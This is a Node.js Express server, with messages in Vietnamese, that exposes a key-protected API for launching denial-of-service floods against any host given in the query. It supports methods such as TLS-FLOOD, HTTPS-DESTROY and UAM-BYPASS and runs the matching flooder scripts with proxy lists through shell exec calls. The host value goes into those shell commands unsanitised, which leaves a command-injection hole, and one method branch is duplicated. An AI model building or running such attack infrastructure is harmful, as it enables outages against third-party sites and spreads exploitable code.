const express = require('express');
const app = express();
const port = 9081;
var exec = require('child_process').exec
let lastAPICallTime = Date.now();

app.get('/', (req, res) => {
const currentTime = Date.now();
  const cooldown = 60 * 1000
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const { key, host, time, method } = req.query;
  console.log(`IP Connect: ${clientIP}`)
  if (!key || !host || !time || !method) {
    const err_u = {
      error: `true`,
      message: `sai url, url cần phải đủ: /api/attack?key=[key]&host=[url]&method=[methods]&time=[time]`,
      code: '410'
    };
    return res.status(400).send(err_u);
  }

  if (key !== '1234') {
    const err_key = {
      message: `sai key`,
      code: '401'
    };
    return res.status(400).send(err_key);
  }

  if (time > 60) {
    const err_time = {
      message: `thời gian phải dưới 60s`,
      code: '400'
    };
    return res.status(400).send(err_time);
  }

  if (!host) {
    const err_host = {
      message: `thiếu host`,
      code: '404'
    };
    return res.status(400).send(err_host);
  }

  if (
    !(
      method.toLowerCase() === 'tls-bypass' ||
      method.toLowerCase() === 'tls-flood' ||
      method.toLowerCase() === 'browser' ||
      method.toLowerCase() === 'https-raw' ||
      method.toLowerCase() === 'https-destroy' ||
      method.toLowerCase() === 'https-flood' ||
      method.toLowerCase() === 'https-flood' ||
      method.toLowerCase() === 'uam-bypass' ||
      method.toLowerCase() === 'https-load'
    )
  ) {
    const err_method = {
      err: `true`,
      method_valid: `sai method api chỉ có: TLS-BYPASS | TLS-FLOOD | BROWSER | HTTPS-RAW | HTTPS-LOAD | HTTPS-DESTROY | UAM-BYPASS`,
      code: '403'
    };
    return res.status(400).send(err_method);
  }
  if (currentTime - lastAPICallTime < cooldown) {
    const err_cooldown = {
      message: `đợi timeout ${Math.ceil((cooldown - (currentTime - lastAPICallTime)) / 1000)} seconds.`,
      time_api: `${Math.ceil((cooldown - (currentTime - lastAPICallTime)) / 1000)}s`,
      code: '429'
    };
    return res.status(429).send(err_cooldown);
  }

  const jsonData = {
    error: `false`,
    message: `thành công`,
    host: `${host}`,
    time: `${time}`,
    method: `${method}`,
    code: '200'
  };
  res.status(200).send(jsonData);
  lastAPICallTime = currentTime;
  if (method.toLowerCase() === 'tls-bypass') {
    
    exec(`node method/UAM-BYPASS.js ${host} ${time} 64 20 method/proxy.py`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      if (stdout) {
        console.error(`stderr: ${stderr}`);
      }
      console.log(`[${clientIP}] Command [TLS-BYPASS] executed successfully`);
     
    });
  }


  if (method.toLowerCase() === 'tls-bypass') {
   
    exec(`node method/TLS-BYPASS.js ${host} ${time} 64 20 method/proxy.py`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log(`[${clientIP}] Command [TLS-BYPASS] executed successfully`);
      
    });
  }


  if (method.toLowerCase() === 'tls-flood') {
    
    exec(`node method/TLS-FLOODER.js ${host} ${time} 64 20 method/proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log(`[${clientIP}] Command [TLS-FLOOD] executed successfully`);
      
    });
  }


  if (method.toLowerCase() === 'browser') {
    
    exec(`node method/HTTP-BROWSER.js ${host} ${time}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log(`[${clientIP}] Command [BROWSER] executed successfully`);
     
    });
  }


  if (method.toLowerCase() === 'https-load') {
    
    exec(`node method/HTTPS-LOAD.js ${host} ${time} 64 20 method/proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log(`[${clientIP}] RUN HTTPS-LOAD`);
      
    });
  }


  if (method.toLowerCase() === 'https-raw') {
    exec(`node method/HTTP-RAW.js ${host} ${time}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log(`[${clientIP}] RUN HTTP-RAW`);
    });
  }

  if (method.toLowerCase() === 'https-destroy') {
    exec(`node method/HTTP-DESTROY.js ${host} ${time} 64 20`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log(`[${clientIP}] RUN HTTP-RAW`);
    });
  }
})
app.listen(port, () => {
  console.log(`[API] running on http://localhost:${port}`);
});
